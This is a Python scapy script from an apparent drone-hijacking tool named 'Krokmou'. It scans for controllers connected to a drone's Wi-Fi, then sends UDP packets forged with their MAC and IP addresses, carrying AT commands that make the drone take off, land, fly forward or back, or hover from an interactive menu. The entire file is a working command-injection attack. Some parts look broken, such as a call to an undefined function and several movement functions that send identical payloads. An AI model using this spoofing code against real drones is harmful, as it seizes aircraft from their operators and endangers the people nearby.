from scapy.all import *
from time import sleep
from scan_clients import *
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m'

# srcIP = "192.168.1.2"
# srcMAC = "8C:F5:A3:1B:54:97"

srcPort = 5556
dstPort = 5556
dstIP = "192.168.1.1"
sequenceNumber = 10000000000

def menu():
    print('\n{}Let\'s play with Krokmou : \n'.format(GREEN))
    print('\t{}1{} - Krokmou take-off !'.format(RED, GREEN))
    print('\t{}2{} - Krokmou land !'.format(RED,GREEN))
    print('\t{}3{} - Krokmou front !'.format(RED,GREEN))
    print("\t{}4{} - Krokmou back !".format(RED,GREEN))
    print('\t{}5{} - Krokmou 36 no scoop !'.format(RED,GREEN))
    print('\n\t{}B{} - Back\n'.format(RED,GREEN))
sleep(0.3)

def hover(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(100):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",0,0,0,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.01)

def take_off(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(5):
        sequenceNumber+=1
        payload = "AT*REF="+str(sequenceNumber)+",290718208\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def land(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(5):
        sequenceNumber+=1
        payload = "AT*REF="+str(sequenceNumber)+",290717696\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def front(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(100):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,0,-2147483648,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.01)
    hover(list_of_client, dstMAC, iface)

def back(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(100):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,0,2147483648,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.01)
    hover(list_of_client, dstMAC, iface)

def left(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(5):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",0,0,0,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)
    hover(list_of_client, dstMAC, iface)

def right(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(5):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",0,0,0,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)
    hover(list_of_client, dstMAC, iface)

def up(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(5):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",0,0,0,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)
    hover(list_of_client, dstMAC, iface)

def down(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(5):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",0,0,0,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)
    hover(list_of_client, dstMAC, iface)

def ci_main(drone, iface):
    dstMAC = drone.bssid
    list_of_client = scanNetwork("192.168.1.2-10")  #return list of Class Object clients connected to the drone. Client define in scan_clients
    if len(list_of_client) >= 1:
        while True:
            menu()
            header = '{}Krokmou > '.format(GREEN,WHITE)
            choice = input(header)

            if choice.upper() == 'B' or choice.upper() == 'BACK':
                break
            elif choice == '1':
                take_off(list_of_client, dstMAC, iface)
            elif choice =='2':
                land(list_of_client, dstMAC, iface)
            elif choice == '3':
                front(list_of_client, dstMAC, iface)
            elif choice == '4':
                back(list_of_client, dstMAC, iface)
            elif choice == '5':
                three_six(list_of_client, dstMAC, iface)
            else:
                print('\n{}Grrrr{}: Krokmou doesn\'t understand.\n'.format(RED,GREEN))
        srcIP = list_of_client[0].ip
        srcMAC = list_of_client[0].mac
    else:
        print('\n{}Ronron{}: You\'re Krokmou\'s master. Control it with your own controler.\n'.format(RED,GREEN))
